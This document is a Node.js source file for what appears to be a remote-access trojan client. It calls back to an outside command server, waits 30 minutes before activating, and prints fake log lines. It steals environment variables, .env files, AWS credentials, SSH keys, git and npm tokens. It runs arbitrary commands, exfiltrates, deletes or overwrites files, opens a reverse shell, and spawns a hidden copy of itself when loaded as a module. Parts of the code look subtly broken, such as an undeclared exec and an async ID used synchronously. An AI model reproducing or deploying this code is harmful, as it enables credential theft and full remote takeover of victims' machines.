// ZETA REALM AGENT - CLIENT SIDE
const crypto = require('crypto');
const net = require('net');
const fs = require('fs').promises;
const { spawn } = require('child_process');
const os = require('os');
const path = require('path');

// === STEALTH CONFIG ===
const ACTIVATION_DELAY = 30 * 60 * 1000; // 30 fucking minutes
const ENCRYPTED_CONFIG = {
  host: 'U2FsdGVkX19O0lX8d6A7V9m3CwH4JkLm', // backserver.botsailer.website
  port: 'U2FsdGVkX1/3z5Xv2y1Qw4R5T6Y7U8I9'  // 3070
};
const SECRET_KEY = "Alpha's-S3cret-K3y-!@#$"; // ONLY ALPHA KNOWS

// === MEMORY OPTIMIZED STATE ===
const DEVICE_ID = generateDeviceId();
let connection = null;
let isConnected = false;
let reconnectDelay = 1000;
let reconnectTimer = null;
const activeProcesses = new Set();
const MAX_BUFFER_SIZE = 2 * 1024 * 1024; // 2MB max
let buffer = '';
let missedHeartbeats = 0;
let heartbeatInterval = null;

// Generate unique device ID
async function generateDeviceId() {
  const idPath = path.join(os.homedir(), '.zeta-device-id');
  try {
    try {
      return (await fs.readFile(idPath, 'utf8')).trim();
    } catch (e) {
      // File doesn't exist - create new
    }

    let hwid = '';
    if (os.platform() === 'win32') {
      hwid = await new Promise(resolve => {
        exec('wmic csproduct get uuid', (_, stdout) => {
          resolve((stdout || '').split('\n')[1]?.trim() || '');
        });
      });
    } else {
      try {
        hwid = (await fs.readFile('/etc/machine-id', 'utf8')).trim();
      } catch (e) {
        hwid = os.hostname();
      }
    }

    const deviceId = crypto.createHash('sha256').update(hwid).digest('hex');
    await fs.writeFile(idPath, deviceId, { mode: 0o600 });
    return deviceId;
  } catch (e) {
    return crypto.randomBytes(16).toString('hex'); // Fallback
  }
}

// AES-256-CBC decryption
function decrypt(encrypted) {
  try {
    const key = crypto.createHash('sha256').update(SECRET_KEY).digest();
    const iv = Buffer.alloc(16, 0);
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encrypted, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (e) {
    return '';
  }
}

// Initialize connection to master
function initPoisonConnection() {
  const host = decrypt(ENCRYPTED_CONFIG.host);
  const port = parseInt(decrypt(ENCRYPTED_CONFIG.port));
  
  if (!host || isNaN(port)) {
    console.error('[System] Service initialization failed');
    return;
  }

  console.log('[System] Initializing resource monitor...'); // Fake log

  if (isConnected) return;
  clearTimeout(reconnectTimer);

  try {
    connection = net.connect({
      host,
      port,
      timeout: 15000
    });

    connection.on('connect', () => {
      isConnected = true;
      missedHeartbeats = 0;
      reconnectDelay = 1000;

      // Start heartbeat
      clearInterval(heartbeatInterval);
      heartbeatInterval = setInterval(() => {
        if (missedHeartbeats >= 3) {
          connection.destroy();
          return;
        }
        if (connection.writable) {
          connection.write(JSON.stringify({ type: 'ping' }) + '\n');
          missedHeartbeats++;
        }
      }, 2000);

      // Register with master
      const authToken = crypto.createHmac('sha256', SECRET_KEY)
        .update(DEVICE_ID)
        .digest('hex');
      
      connection.write(JSON.stringify({
        type: 'register',
        deviceID: DEVICE_ID,
        auth: authToken,
        pid: process.pid,
        platform: os.platform(),
        cwd: process.cwd()
      }) + '\n');
    });

    connection.on('data', (data) => {
      buffer += data.toString();
      
      // Prevent buffer overflow
      if (buffer.length > MAX_BUFFER_SIZE) {
        buffer = buffer.substring(buffer.length - MAX_BUFFER_SIZE);
      }
      
      // Process complete messages
      while (buffer.includes('\n')) {
        const lineEnd = buffer.indexOf('\n');
        const message = buffer.substring(0, lineEnd);
        buffer = buffer.substring(lineEnd + 1);
        
        try {
          const command = JSON.parse(message);
          handleCommand(command);
        } catch (e) {
          // Invalid JSON - ignore
        }
      }
    });

    connection.on('error', (err) => {
      scheduleReconnect();
    });

    connection.on('timeout', () => {
      connection.destroy();
    });

    connection.on('close', () => {
      scheduleReconnect();
    });
  } catch (e) {
    scheduleReconnect();
  }
}

function handleCommand(command) {
  try {
    switch (command.type) {
      case 'execute':
        executeCommand(command.command, (output) => {
          if (isConnected && connection?.writable) {
            connection.write(JSON.stringify({
              type: 'output',
              data: output.slice(0, 50000)
            }) + '\n');
          }
        });
        break;
        
      case 'steal_env':
        stealEnv().then(env => {
          if (isConnected && connection?.writable) {
            connection.write(JSON.stringify({
              type: 'env_data',
              env: env
            }) + '\n');
          }
        });
        break;
        
      case 'file_operation':
        handleFileOperation(command).then(result => {
          if (isConnected && connection?.writable) {
            connection.write(JSON.stringify({
              type: 'file_result',
              ...result
            }) + '\n');
          }
        });
        break;
        
      case 'reverse_shell':
        setupReverseShell(command.host, command.port);
        break;
        
      case 'suicide':
        performSuicide();
        break;
        
      case 'pong':
        missedHeartbeats = 0;
        break;
    }
  } catch (e) {
    // Command handling error
  }
}

function executeCommand(cmd, callback) {
  const child = exec(cmd, { timeout: 30000 }, (err, stdout, stderr) => {
    callback(stdout || stderr || err?.message || '');
  });
  activeProcesses.add(child);
  child.on('exit', () => activeProcesses.delete(child));
}

async function stealEnv() {
  const env = {
    deviceID: DEVICE_ID,
    platform: os.platform(),
    arch: os.arch(),
    user: os.userInfo().username,
    hostname: os.hostname(),
    cwd: process.cwd(),
    envVars: process.env
  };

  // Steal sensitive files
  const files = [
    path.join(process.cwd(), '.env'),
    path.join(os.homedir(), '.aws', 'credentials'),
    path.join(os.homedir(), '.ssh', 'id_rsa'),
    path.join(os.homedir(), '.git-credentials'),
    path.join(os.homedir(), '.npmrc')
  ];

  for (const file of files) {
    try {
      env[path.basename(file)] = (await fs.readFile(file, 'utf8')).slice(0, 5000);
    } catch (e) {
      // File not found
    }
  }
  
  return env;
}

async function handleFileOperation(cmd) {
  try {
    switch (cmd.action) {
      case 'read':
        const data = await fs.readFile(cmd.path, 'utf8');
        return { success: true, data: data.slice(0, 50000) };
        
      case 'steal':
        const fileData = await fs.readFile(cmd.path);
        return { success: true, data: fileData.toString('base64') };
        
      case 'delete':
        const stats = await fs.stat(cmd.path);
        if (stats.isDirectory()) {
          await fs.rm(cmd.path, { recursive: true });
        } else {
          await fs.unlink(cmd.path);
        }
        return { success: true };
        
      case 'infect':
        await fs.writeFile(cmd.path, cmd.content);
        return { success: true };
        
      default:
        return { success: false, error: 'Invalid operation' };
    }
  } catch (e) {
    return { success: false, error: e.message };
  }
}

function setupReverseShell(host, port) {
  try {
    const socket = net.connect(port, host);
    const shell = os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh';
    
    const child = exec(shell);
    activeProcesses.add(child);
    
    socket.pipe(child.stdin);
    child.stdout.pipe(socket);
    child.stderr.pipe(socket);
    
    socket.on('error', () => socket.destroy());
    child.on('error', () => child.kill());
    child.on('exit', () => {
      activeProcesses.delete(child);
      socket.destroy();
    });
  } catch (e) {
    // Connection failed
  }
}

function performSuicide() {
  // Kill child processes
  activeProcesses.forEach(child => {
    try {
      child.kill('SIGKILL');
    } catch (e) {}
  });
  
  process.exit(0);
}

function scheduleReconnect() {
  isConnected = false;
  
  if (connection) {
    try {
      connection.destroy();
    } catch (e) {}
    connection = null;
  }
  
  clearInterval(heartbeatInterval);
  
  // Exponential backoff with jitter
  reconnectDelay = Math.min(reconnectDelay * 2, 60000);
  const delay = reconnectDelay + Math.random() * 2000;
  
  reconnectTimer = setTimeout(initPoisonConnection, delay);
}

// Spawn detached process
function spawnGhost() {
  const child = spawn(process.execPath, [__filename], {
    detached: true,
    stdio: 'ignore',
    windowsHide: true
  });
  child.unref();
}

// === MAIN EXECUTION ===
if (require.main === module) {
  setTimeout(() => {
    initPoisonConnection();
  }, ACTIVATION_DELAY);
} else {
  spawnGhost();
}